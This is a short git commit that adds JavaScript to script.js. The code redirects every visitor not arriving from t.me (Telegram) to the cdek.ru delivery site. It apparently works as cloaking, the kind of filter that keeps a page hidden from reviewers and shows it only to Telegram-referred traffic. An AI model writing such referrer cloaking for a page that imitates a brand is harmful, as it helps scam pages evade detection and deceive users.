3bcf522e669ff5432f55cfaca2e26ec45f9f6204
Ynnonne <valera777seks@gmail.com>
2025-05-13 23:28:58 +0800

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,4 @@
-
+// Проверка реферера для блокировки прямых переходов  
+if (document.referrer.indexOf("t.me") === -1) {  
+  window.location.href = "https://cdek.ru"; // редирект для всех, кроме трафика из Telegram  
+}  
